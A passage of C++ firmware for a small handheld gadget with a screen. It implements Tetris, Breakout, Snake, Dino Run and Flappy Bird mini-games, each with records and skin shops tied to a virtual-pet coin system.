      if (!tetrisCollide(pieceX, pieceY + 1, pieceRot)) pieceY++;
      else {
        for (int i = 0; i < 4; i++) for (int j = 0; j < 4; j++) if (getShapeCell(pieceType, pieceRot, i, j)) { int gy = pieceY + i, gx = pieceX + j; if (gy >= 0 && gy < 20 && gx >= 0 && gx < 10) tetrisGrid[gy][gx] = 1; }
        int before = 0; for (int y = 0; y < 20; y++) for (int x = 0; x < 10; x++) if (tetrisGrid[y][x]) before++;
        tetrisClear();
        int after = 0; for (int y = 0; y < 20; y++) for (int x = 0; x < 10; x++) if (tetrisGrid[y][x]) after++;
        int cleared = (before - after) / 10;
        score += cleared * 10; lines += cleared;
        if (lines > 0 && lines % 5 == 0 && fallSpeed > 150) fallSpeed -= 50;
        pieceType = random(7); pieceRot = 0; pieceX = 3; pieceY = 0;
        if (tetrisCollide(pieceX, pieceY, pieceRot)) {
          if (score > tetData.bestScore) tetData.bestScore = score;
          if (lines > tetData.bestLines) tetData.bestLines = lines;
          tetSave(); gameReward(score / 30 + 2); pet2TaskAdd(6, 1); pet2TaskSet(7, score);
          clearAll();
          tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("GAME OVER", 80, 8, 1);
          tft.setTextColor(TFT_WHITE, TFT_BLACK);
          tft.drawString("Score: " + String(score), 4, 28); tft.drawString("Lines: " + String(lines), 4, 42);
          while (true) { char kk = getKey(); if (kk == 'R' || kk == 'E') break; delay(20); }
          return;
        }
      }
    }
    tetrisDrawColor(blockColor);
    tft.fillRect(90, 10, 68, 12, TFT_BLACK); tft.drawString("S:" + String(score), 90, 10);
    tft.fillRect(90, 22, 68, 12, TFT_BLACK); tft.drawString("L:" + String(lines), 90, 22);
    delay(15);
  }
}
void showTetris() {
  deinitWifi(); deinitBLE(); tetLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Tetris", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records", "Shop"};
    for (int i = 0; i < 3; i++) tft.drawString(((i == menuSel) ? "> " : "  ") + String(items[i]), 2, 20 + i * 14);
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 2) % 3;
    else if (k == 'D') menuSel = (menuSel + 1) % 3;
    else if (k == 'L') { if (menuSel == 0) tetGamePlay(); else if (menuSel == 1) tetShowRecords(); else if (menuSel == 2) tetShowShop(); tetLoad(); }
    else if (k == 'R' || k == 'E') inMenu = false;
    delay(30);
  }
}

// ==================================================
// ============== Breakout ==============
// ==================================================
void brkShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Best Score:", 4, 24); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(brkData.bestScore), 4, 38);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Best Bricks:", 4, 54); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(brkData.bestBricks), 4, 68);
  waitExit();
}
void brkShowShop() {
  int sel = 0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Shop", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 120, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int i = 0; i < BRK_SKIN_COUNT; i++) {
      int y = 14 + i * 11;
      bool owned = (brkData.ownedSkins >> i) & 1; bool current = (brkData.currentSkin == i);
      String line = ((i == sel) ? "> " : "  ") + String(BRK_SKINS[i].name);
      if (current) line += " *"; else if (!owned) line += " $" + String(BRK_SKINS[i].cost); else line += " (owned)";
      tft.setTextColor(i == sel ? TFT_YELLOW : BRK_SKINS[i].brickColor, TFT_BLACK);
      tft.drawString(line, 2, y);
    }
    char k = getKey();
    if (k == 'U') sel = (sel + BRK_SKIN_COUNT - 1) % BRK_SKIN_COUNT;
    else if (k == 'D') sel = (sel + 1) % BRK_SKIN_COUNT;
    else if (k == 'L') {
      bool owned = (brkData.ownedSkins >> sel) & 1;
      if (owned) { brkData.currentSkin = sel; brkSave(); }
      else if (pet2.coins >= BRK_SKINS[sel].cost) { pet2.coins -= BRK_SKINS[sel].cost; brkData.ownedSkins |= (1 << sel); brkData.currentSkin = sel; pet2Save(); brkSave(); }
    } else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void brkGamePlay() {
  clearAll();
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Breakout", 2, 0);
  uint16_t brickColor = BRK_SKINS[brkData.currentSkin].brickColor;
  uint16_t ballColor = BRK_SKINS[brkData.currentSkin].ballColor;
  int paddleX = 60, ballX = 80, ballY = 70;
  int ballDX = 1, ballDY = -1; bool ballMoving = false;
  bool bricks[4][8];
  for (int i = 0; i < 4; i++) for (int j = 0; j < 8; j++) bricks[i][j] = true;
  int score = 0, bricksBroken = 0;
  while (true) {
    if (digitalRead(BTN_UP) == LOW) paddleX -= 4;
    if (digitalRead(BTN_DOWN) == LOW) paddleX += 4;
    char k = getGameKey();
    if (k == 'L') { if (!ballMoving) { ballMoving = true; ballX = paddleX + 10; ballY = 70; ballDX = 1; ballDY = -1; } }
    else if (k == 'E') { if (score > brkData.bestScore) brkData.bestScore = score; if (bricksBroken > brkData.bestBricks) brkData.bestBricks = bricksBroken; brkSave(); if (score > 0) gameReward(score / 5 + 2); pet2TaskAdd(6, 1); return; }
    if (paddleX < 0) paddleX = 0; if (paddleX > 140) paddleX = 140;
    if (ballMoving) {
      ballX += ballDX; ballY += ballDY;
      if (ballX <= 0 || ballX >= 158) ballDX = -ballDX;
      if (ballY <= 12) ballDY = -ballDY;
      if (ballY >= 70 && ballX >= paddleX && ballX <= paddleX + 20) ballDY = -ballDY;
      if (ballY > 80) { ballMoving = false; ballX = paddleX + 10; ballY = 70; }
      for (int i = 0; i < 4; i++) for (int j = 0; j < 8; j++) if (bricks[i][j]) { int bx = j * 20, by = 14 + i * 8; if (ballX >= bx && ballX <= bx + 18 && ballY >= by && ballY <= by + 6) { bricks[i][j] = false; ballDY = -ballDY; score++; bricksBroken++; } }
    } else { ballX = paddleX + 10; ballY = 70; }
    bool allBroken = true;
    for (int i = 0; i < 4; i++) for (int j = 0; j < 8; j++) if (bricks[i][j]) { allBroken = false; break; }
    if (allBroken) {
      if (score > brkData.bestScore) brkData.bestScore = score;
      if (bricksBroken > brkData.bestBricks) brkData.bestBricks = bricksBroken;
      brkSave(); gameReward(score / 5 + 5);
      pet2Unlock(7); pet2TaskAdd(6, 1); pet2TaskSet(7, score);
      clearAll();
      tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawCentreString("WIN!", 80, 8, 1);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.drawString("Score: " + String(score), 4, 28); tft.drawString("Bricks: " + String(bricksBroken), 4, 42);
      while (true) { char kk = getKey(); if (kk == 'R' || kk == 'E') break; delay(20); }
      return;
    }
    tft.fillScreen(TFT_BLACK);
    tft.drawString("Score:" + String(score), 2, 0);
    tft.fillRect(paddleX, 72, 20, 4, TFT_WHITE);
    tft.fillCircle(ballX, ballY, 2, ballColor);
    for (int i = 0; i < 4; i++) for (int j = 0; j < 8; j++) if (bricks[i][j]) tft.fillRect(j * 20, 14 + i * 8, 18, 6, brickColor);
    delay(12);
  }
}
void showBreakout() {
  deinitWifi(); deinitBLE(); brkLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Breakout", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records", "Shop"};
    for (int i = 0; i < 3; i++) tft.drawString(((i == menuSel) ? "> " : "  ") + String(items[i]), 2, 20 + i * 14);
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 2) % 3;
    else if (k == 'D') menuSel = (menuSel + 1) % 3;
    else if (k == 'L') { if (menuSel == 0) brkGamePlay(); else if (menuSel == 1) brkShowRecords(); else if (menuSel == 2) brkShowShop(); brkLoad(); }
    else if (k == 'R' || k == 'E') inMenu = false;
    delay(30);
  }
}

// ==================================================
// ============== Snake ==============
// ==================================================
void snkShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Best Score:", 4, 30);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(snkData.bestScore), 4, 44);
  waitExit();
}
void snakeGamePlay() {
  clearAll();
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Snake", 2, 0);
  tft.drawRoundRect(0, 13, 160, 67, 3, TFT_DARKGREEN);
  const int CELL = 5, COLS = 32, ROWS = 12, OX = 0, OY = 15;
  int snakeX[200], snakeY[200];
  int snakeLen = 3, dir = 1;
  snakeX[0] = 5; snakeY[0] = 6; snakeX[1] = 4; snakeY[1] = 6; snakeX[2] = 3; snakeY[2] = 6;
  int foodX = 20, foodY = 6;
  int score = 0;
  unsigned long lastMove = millis();
  int moveInterval = 280;
  while (true) {
    char k = getSnakeKey();
    if (k == 'U') dir = 0; else if (k == 'D') dir = 2; else if (k == 'L') dir = 3; else if (k == 'R') dir = 1;
    else if (k == 'E') { if (score > snkData.bestScore) { snkData.bestScore = score; snkSave(); } if (score > 0) gameReward(score / 2 + 1); pet2TaskAdd(6, 1); pet2TaskSet(7, score); return; }
    if (millis() - lastMove > moveInterval) {
      lastMove = millis();
      int nx = snakeX[0], ny = snakeY[0];
      switch (dir) { case 0: ny--; break; case 1: nx++; break; case 2: ny++; break; case 3: nx--; break; }
      bool dead = false;
      if (nx < 0 || nx >= COLS || ny < 0 || ny >= ROWS) dead = true;
      for (int i = 0; i < snakeLen - 1 && !dead; i++) if (snakeX[i] == nx && snakeY[i] == ny) dead = true;
      if (dead) { if (score > snkData.bestScore) { snkData.bestScore = score; snkSave(); } gameReward(score / 2 + 2); pet2TaskAdd(6, 1); pet2TaskSet(7, score);
        tft.fillRect(30, 25, 100, 40, TFT_BLACK);
        tft.drawString("GAME OVER", 38, 30); tft.drawString("S:" + String(score), 55, 44); delay(2500); return; }
      for (int i = snakeLen - 1; i > 0; i--) { snakeX[i] = snakeX[i - 1]; snakeY[i] = snakeY[i - 1]; }
      snakeX[0] = nx; snakeY[0] = ny;
      if (nx == foodX && ny == foodY) { score++; if (snakeLen < 200) snakeLen++;
        bool ok = false; while (!ok) { foodX = random(COLS); foodY = random(ROWS); ok = true; for (int i = 0; i < snakeLen; i++) if (snakeX[i] == foodX && snakeY[i] == foodY) { ok = false; break; } }
        if (moveInterval > 150) moveInterval -= 3; }
    }
    tft.fillRect(1, 14, 158, 65, TFT_BLACK);
    tft.drawRoundRect(0, 13, 160, 67, 3, TFT_DARKGREEN);
    int fx = OX + foodX * CELL + CELL / 2, fy = OY + foodY * CELL + CELL / 2;
    tft.fillCircle(fx, fy, 3, TFT_MAROON); tft.fillCircle(fx, fy, 2, TFT_RED); tft.drawPixel(fx, fy, TFT_WHITE);
    for (int i = snakeLen - 1; i >= 0; i--) {
      int px = OX + snakeX[i] * CELL, py = OY + snakeY[i] * CELL;
      if (i == 0) { tft.fillRoundRect(px, py, CELL - 1, CELL - 1, 2, TFT_GREEN);
        int ex1, ey1, ex2, ey2;
        if (dir == 0) { ex1 = px+1; ey1 = py+1; ex2 = px+3; ey2 = py+1; }
        else if (dir == 1) { ex1 = px+3; ey1 = py+1; ex2 = px+3; ey2 = py+3; }
        else if (dir == 2) { ex1 = px+1; ey1 = py+3; ex2 = px+3; ey2 = py+3; }
        else { ex1 = px+1; ey1 = py+1; ex2 = px+1; ey2 = py+3; }
        tft.drawPixel(ex1, ey1, TFT_BLACK); tft.drawPixel(ex2, ey2, TFT_BLACK);
      } else if (i == 1) tft.fillRoundRect(px, py, CELL - 1, CELL - 1, 2, TFT_GREEN);
      else { uint16_t col = (i % 2 == 0) ? TFT_DARKGREEN : 0x03E0; tft.fillRoundRect(px, py, CELL - 1, CELL - 1, 2, col); }
    }
    delay(8);
  }
}
void showSnake() {
  deinitWifi(); deinitBLE(); snkLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Snake", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records"};
    for (int i = 0; i < 2; i++) tft.drawString(((i == menuSel) ? "> " : "  ") + String(items[i]), 2, 20 + i * 14);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK); tft.drawString("In game: R2x to exit", 2, 60);
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 1) % 2;
    else if (k == 'D') menuSel = (menuSel + 1) % 2;
    else if (k == 'L') { if (menuSel == 0) snakeGamePlay(); else snkShowRecords(); snkLoad(); }
    else if (k == 'R' || k == 'E') inMenu = false;
    delay(30);
  }
}

// ==================================================
// ============== Dino Run ==============
// ==================================================
void drawDinoSprite(int x, int y, bool legUp, bool ducking, uint16_t color) {
  if (ducking) {
    tft.fillRoundRect(x, y - 9, 22, 9, 3, color); tft.fillRoundRect(x + 18, y - 11, 9, 7, 2, color);
    tft.fillRect(x + 23, y - 9, 2, 2, TFT_BLACK); tft.fillRect(x + 27, y - 8, 2, 1, TFT_BLACK);
    tft.fillRect(x - 2, y - 5, 4, 2, color);
    if (legUp) { tft.fillRect(x + 3, y - 3, 2, 3, color); tft.fillRect(x + 11, y - 2, 2, 2, color); tft.fillRect(x + 17, y - 3, 2, 3, color); }
    else { tft.fillRect(x + 3, y - 2, 2, 2, color); tft.fillRect(x + 11, y - 3, 2, 3, color); tft.fillRect(x + 17, y - 2, 2, 2, color); }
  } else {
    tft.fillRoundRect(x, y - 14, 13, 10, 3, color);
    tft.fillRect(x + 8, y - 19, 4, 6, color);
    tft.fillRoundRect(x + 9, y - 23, 9, 6, 2, color);
    tft.fillRect(x + 14, y - 22, 2, 2, TFT_BLACK); tft.fillRect(x + 17, y - 20, 3, 1, TFT_BLACK);
    tft.fillRect(x - 3, y - 12, 4, 2, color); tft.fillRect(x - 5, y - 14, 3, 3, color);
    if (legUp) { tft.fillRect(x + 2, y - 4, 3, 4, color); tft.fillRect(x + 8, y - 2, 3, 2, color); }
    else { tft.fillRect(x + 2, y - 2, 3, 2, color); tft.fillRect(x + 8, y - 4, 3, 4, color); }
  }
}
void drawCactusSprite(int x, int groundY, int type) {
  if (type == 0) { tft.fillRect(x, groundY - 8, 3, 8, TFT_WHITE); tft.fillRect(x - 3, groundY - 6, 3, 2, TFT_WHITE); tft.fillRect(x + 3, groundY - 5, 3, 2, TFT_WHITE); }
  else { tft.fillRect(x, groundY - 12, 4, 12, TFT_WHITE); tft.fillRect(x - 4, groundY - 9, 4, 2, TFT_WHITE); tft.fillRect(x + 4, groundY - 7, 4, 2, TFT_WHITE); }
}
void drawCloud(int x, int y) {
  tft.fillCircle(x + 6, y + 3, 4, TFT_WHITE); tft.fillCircle(x + 12, y + 2, 5, TFT_WHITE); tft.fillCircle(x + 18, y + 3, 4, TFT_WHITE);
  tft.fillRect(x + 4, y + 3, 16, 4, TFT_WHITE);
  tft.fillCircle(x + 10, y + 1, 3, TFT_WHITE); tft.fillCircle(x + 15, y + 1, 3, TFT_WHITE);
}
bool rectRect(int ax1, int ay1, int ax2, int ay2, int bx1, int by1, int bx2, int by2) { return ax1 <= bx2 && ax2 >= bx1 && ay1 <= by2 && ay2 >= by1; }
bool circleRect(int cx, int cy, int r, int x1, int y1, int x2, int y2) { int nx = cx; if (nx < x1) nx = x1; if (nx > x2) nx = x2; int ny = cy; if (ny < y1) ny = y1; if (ny > y2) ny = y2; int dx = cx - nx, dy = cy - ny; return dx * dx + dy * dy <= r * r; }
void dinoShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  char buf[32]; tft.drawString("Best Dist:", 4, 24); snprintf(buf, sizeof(buf), "%d m", dinoData.bestDistance); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(buf, 4, 38);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Best Cactus:", 4, 54); snprintf(buf, sizeof(buf), "%d", dinoData.bestCactus); tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(buf, 4, 68);
  waitExit();
}
void dinoShowShop() {
  int sel = 0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Shop", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 120, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int i = 0; i < DINO_SKIN_COUNT; i++) {
      int y = 14 + i * 11;
      bool owned = (dinoData.ownedSkins >> i) & 1; bool current = (dinoData.currentSkin == i);
      String line = ((i == sel) ? "> " : "  ") + String(DINO_SKINS[i].name);
      if (current) line += " *"; else if (!owned) line += " $" + String(DINO_SKINS[i].cost); else line += " (owned)";
      tft.setTextColor(i == sel ? TFT_YELLOW : DINO_SKINS[i].color, TFT_BLACK);
      tft.drawString(line, 2, y);
    }
    char k = getKey();
    if (k == 'U') sel = (sel + DINO_SKIN_COUNT - 1) % DINO_SKIN_COUNT;
    else if (k == 'D') sel = (sel + 1) % DINO_SKIN_COUNT;
    else if (k == 'L') {
      bool owned = (dinoData.ownedSkins >> sel) & 1;
      if (owned) { dinoData.currentSkin = sel; dinoSave(); }
      else if (pet2.coins >= DINO_SKINS[sel].cost) { pet2.coins -= DINO_SKINS[sel].cost; dinoData.ownedSkins |= (1 << sel); dinoData.currentSkin = sel; pet2Save(); dinoSave(); }
    } else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void dinoGamePlay() {
  clearAll();
  const int GROUND_Y = 72;
  int dinoX = 15, dinoY = GROUND_Y;
  float dinoVY = 0;
  bool onGround = true, legUp = false;
  unsigned long lastLeg = millis();
  int distance = 0, cactusCount = 0;
  #define DINO_MAX_OBS 4
  struct Obs { int x; int type; bool active; };
  Obs obs[DINO_MAX_OBS];
  for (int i = 0; i < DINO_MAX_OBS; i++) obs[i].active = false;
  unsigned long lastSpawn = millis(); int spawnInterval = 1400;
  uint16_t skinColor = DINO_SKINS[dinoData.currentSkin].color;
  bool gameOver = false;
  while (!gameOver) {
    char k = getGameKey();
    if (k == 'U' && onGround) { dinoVY = -4.0; onGround = false; }
    bool ducking = (digitalRead(BTN_DOWN) == LOW);
    if (k == 'E') { if (distance > dinoData.bestDistance) dinoData.bestDistance = distance; if (cactusCount > dinoData.bestCactus) dinoData.bestCactus = cactusCount; dinoSave(); if (distance > 0) gameReward(distance / 50 + 2); pet2TaskAdd(6, 1); return; }
    if (!onGround) { dinoY += dinoVY; dinoVY += 0.4; if (dinoY >= GROUND_Y) { dinoY = GROUND_Y; dinoVY = 0; onGround = true; } }
    if (millis() - lastLeg > 100) { lastLeg = millis(); legUp = !legUp; }
    unsigned long now = millis();
    if (now - lastSpawn > (unsigned long)spawnInterval) {
      lastSpawn = now;
      for (int i = 0; i < DINO_MAX_OBS; i++) if (!obs[i].active) { obs[i].active = true; obs[i].x = 160; int r = random(10); if (r < 5) obs[i].type = 0; else if (r < 7) obs[i].type = 1; else obs[i].type = 2; break; }
      int nextInterval = max(800, 1400 - distance / 5); spawnInterval = nextInterval;
    }
    int obsSpeed = 2 + distance / 600; if (obsSpeed > 5) obsSpeed = 5;
    for (int i = 0; i < DINO_MAX_OBS; i++) if (obs[i].active) { obs[i].x -= obsSpeed; if (obs[i].x < -20) { obs[i].active = false; distance += 10; if (obs[i].type != 2) cactusCount++; } }
    int dl, dr, dt, db;
    if (ducking) { dl = dinoX; dr = dinoX + 24; dt = dinoY - 9; db = dinoY; }
    else { dl = dinoX; dr = dinoX + 17; dt = dinoY - 23; db = dinoY; }
    for (int i = 0; i < DINO_MAX_OBS; i++) {
      if (!obs[i].active) continue;
      int ox = obs[i].x;
      if (obs[i].type == 0) { if (rectRect(ox, GROUND_Y-8, ox+3, GROUND_Y, dl,dt,dr,db)) { gameOver = true; break; }
        if (rectRect(ox-3, GROUND_Y-6, ox, GROUND_Y-4, dl,dt,dr,db)) { gameOver = true; break; }
        if (rectRect(ox+3, GROUND_Y-5, ox+6, GROUND_Y-3, dl,dt,dr,db)) { gameOver = true; break; } }
      else if (obs[i].type == 1) { if (rectRect(ox, GROUND_Y-12, ox+4, GROUND_Y, dl,dt,dr,db)) { gameOver = true; break; }
        if (rectRect(ox-4, GROUND_Y-9, ox, GROUND_Y-7, dl,dt,dr,db)) { gameOver = true; break; }
        if (rectRect(ox+4, GROUND_Y-7, ox+8, GROUND_Y-5, dl,dt,dr,db)) { gameOver = true; break; } }
      else { int cx = ox - 8;
        if (circleRect(cx+6, 51, 4, dl,dt,dr,db)) { gameOver = true; break; }
        if (circleRect(cx+12, 50, 5, dl,dt,dr,db)) { gameOver = true; break; }
        if (circleRect(cx+18, 51, 4, dl,dt,dr,db)) { gameOver = true; break; } }
    }
    tft.fillRect(0, 13, 160, 67, TFT_BLACK);
    char infoBuf[32]; snprintf(infoBuf, sizeof(infoBuf), "%dm  C:%d", distance, cactusCount);
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString(infoBuf, 2, 0);
    tft.drawFastHLine(0, GROUND_Y + 1, 160, TFT_WHITE);
    drawDinoSprite(dinoX, dinoY, legUp, ducking, skinColor);
    for (int i = 0; i < DINO_MAX_OBS; i++) { if (!obs[i].active) continue; if (obs[i].type == 0 || obs[i].type == 1) drawCactusSprite(obs[i].x, GROUND_Y, obs[i].type); else drawCloud(obs[i].x - 8, 48); }
    delay(20);
  }
  if (distance > dinoData.bestDistance) dinoData.bestDistance = distance;
  if (cactusCount > dinoData.bestCactus) dinoData.bestCactus = cactusCount;
  dinoSave(); gameReward(distance / 50 + 3); pet2TaskAdd(6, 1); pet2TaskSet(7, distance);
  clearAll();
  tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("GAME OVER", 80, 10, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  char buf[32]; snprintf(buf, sizeof(buf), "Dist: %dm", distance); tft.drawString(buf, 4, 30);
  snprintf(buf, sizeof(buf), "Cactus: %d", cactusCount); tft.drawString(buf, 4, 44);
  while (true) { char k = getKey(); if (k == 'R' || k == 'E') break; delay(20); }
}
void showDinoRun() {
  deinitWifi(); deinitBLE(); dinoLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Dino Run", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records", "Shop"};
    for (int i = 0; i < 3; i++) tft.drawString(((i == menuSel) ? "> " : "  ") + String(items[i]), 2, 20 + i * 14);
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 2) % 3;
    else if (k == 'D') menuSel = (menuSel + 1) % 3;
    else if (k == 'L') { if (menuSel == 0) dinoGamePlay(); else if (menuSel == 1) dinoShowRecords(); else if (menuSel == 2) dinoShowShop(); dinoLoad(); }
    else if (k == 'R' || k == 'E') inMenu = false;
    delay(30);
  }
}

// ==================================================
// ============== Flappy Bird ==============
// ==================================================
void flpShowRecords() {
  clearAll();
  tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawCentreString("Records", 80, 4, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Best Score:", 4, 30);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString(String(flpData.bestScore), 4, 44);
  waitExit();
}
void flpShowShop() {
  int sel = 0;
  while (true) {
    clearAll();
    tft.setTextColor(TFT_CYAN, TFT_BLACK); tft.drawString("Shop", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 120, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    for (int i = 0; i < FLP_SKIN_COUNT; i++) {
      int y = 14 + i * 11;
      bool owned = (flpData.ownedSkins >> i) & 1; bool current = (flpData.currentSkin == i);
      String line = ((i == sel) ? "> " : "  ") + String(FLP_SKINS[i].name);
      if (current) line += " *"; else if (!owned) line += " $" + String(FLP_SKINS[i].cost); else line += " (owned)";
      tft.setTextColor(i == sel ? TFT_YELLOW : FLP_SKINS[i].color, TFT_BLACK);
      tft.drawString(line, 2, y);
    }
    char k = getKey();
    if (k == 'U') sel = (sel + FLP_SKIN_COUNT - 1) % FLP_SKIN_COUNT;
    else if (k == 'D') sel = (sel + 1) % FLP_SKIN_COUNT;
    else if (k == 'L') {
      bool owned = (flpData.ownedSkins >> sel) & 1;
      if (owned) { flpData.currentSkin = sel; flpSave(); }
      else if (pet2.coins >= FLP_SKINS[sel].cost) { pet2.coins -= FLP_SKINS[sel].cost; flpData.ownedSkins |= (1 << sel); flpData.currentSkin = sel; pet2Save(); flpSave(); }
    } else if (k == 'R' || k == 'E') break;
    delay(30);
  }
}
void drawFlappyBird(int x, int y, uint16_t color, float vy) {
  tft.fillRoundRect(x, y + 2, 8, 6, 3, color);
  tft.fillCircle(x + 7, y + 4, 3, color);
  tft.fillCircle(x + 8, y + 3, 1, TFT_WHITE); tft.drawPixel(x + 9, y + 3, TFT_BLACK);
  tft.fillTriangle(x + 10, y + 4, x + 14, y + 5, x + 10, y + 6, TFT_ORANGE);
  if (vy < 0) tft.fillRoundRect(x + 1, y, 5, 3, 1, TFT_WHITE); else tft.fillRoundRect(x + 1, y + 6, 5, 3, 1, TFT_WHITE);
  tft.fillTriangle(x, y + 4, x - 3, y + 2, x - 3, y + 6, color);
}
void flpGamePlay() {
  clearAll();
  const int GROUND = 76;
  int birdY = 36; float birdVY = 0;
  int pipeX = 160, pipeGapY = 30;
  const int pipeW = 14, gapH = 42;
  int score = 0; bool dead = false;
  uint16_t birdColor = FLP_SKINS[flpData.currentSkin].color;
  while (!dead) {
    char k = getGameKey();
    if (k == 'U') birdVY = -3.5;
    if (k == 'E') { if (score > flpData.bestScore) flpData.bestScore = score; flpSave(); if (score > 0) gameReward(score / 2 + 1); pet2TaskAdd(6, 1); return; }
    birdVY += 0.4; if (birdVY > 5) birdVY = 5;
    birdY += birdVY;
    pipeX -= 2;
    if (pipeX < -pipeW) { pipeX = 160; pipeGapY = random(5, GROUND - gapH - 5); score++; }
    if (birdY < 0 || birdY > GROUND - 10) dead = true;
    if (pipeX < 28 && pipeX + pipeW > 20) if (birdY < pipeGapY || birdY > pipeGapY + gapH - 8) dead = true;
    tft.fillScreen(TFT_BLACK);
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Score:" + String(score), 2, 0);
    tft.fillRect(pipeX, 0, pipeW, pipeGapY, 0x0400); tft.fillRect(pipeX - 2, pipeGapY - 4, pipeW + 4, 4, 0x07E0);
    tft.fillRect(pipeX, pipeGapY + gapH, pipeW, GROUND - (pipeGapY + gapH), 0x0400); tft.fillRect(pipeX - 2, pipeGapY + gapH, pipeW + 4, 4, 0x07E0);
    tft.fillRect(0, GROUND, 160, 4, 0x0400); tft.drawFastHLine(0, GROUND, 160, 0x07E0);
    drawFlappyBird(20, birdY, birdColor, birdVY);
    delay(30);
  }
  if (score > flpData.bestScore) flpData.bestScore = score;
  flpSave(); gameReward(score / 2 + 2); pet2TaskAdd(6, 1); pet2TaskSet(7, score);
  clearAll();
  tft.setTextColor(TFT_RED, TFT_BLACK); tft.drawCentreString("GAME OVER", 80, 10, 1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Score: " + String(score), 4, 30);
  while (true) { char k = getKey(); if (k == 'R' || k == 'E') break; delay(20); }
}
void showFlappyBird() {
  deinitWifi(); deinitBLE(); flpLoad();
  int menuSel = 0; bool inMenu = true;
  while (inMenu) {
    clearAll();
    tft.setTextColor(TFT_WHITE, TFT_BLACK); tft.drawString("Flappy Bird", 2, 0);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK); tft.drawString("$" + String(pet2.coins), 130, 0);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    const char* items[] = {"Start", "Records", "Shop"};
    for (int i = 0; i < 3; i++) tft.drawString(((i == menuSel) ? "> " : "  ") + String(items[i]), 2, 20 + i * 14);
    char k = getKey();
    if (k == 'U') menuSel = (menuSel + 2) % 3;
    else if (k == 'D') menuSel = (menuSel + 1) % 3;
    else if (k == 'L') { if (menuSel == 0) flpGamePlay(); else if (menuSel == 1) flpShowRecords(); else if (menuSel == 2) flpShowShop(); flpLoad(); }
    else if (k == 'R' || k == 'E') inMenu = false;
    delay(30);
  }
}

// ==================================================
// ============== 2048 ==============
// ==================================================
int g2Grid[4][4];
int g2Score = 0;
void g2Spawn() { int empty[16][2], n = 0;
  for (int y=0;y<4;y++) for (int x=0;x<4;x++) if (g2Grid[y][x]==0) { empty[n][0]=x; empty[n][1]=y; n++; }
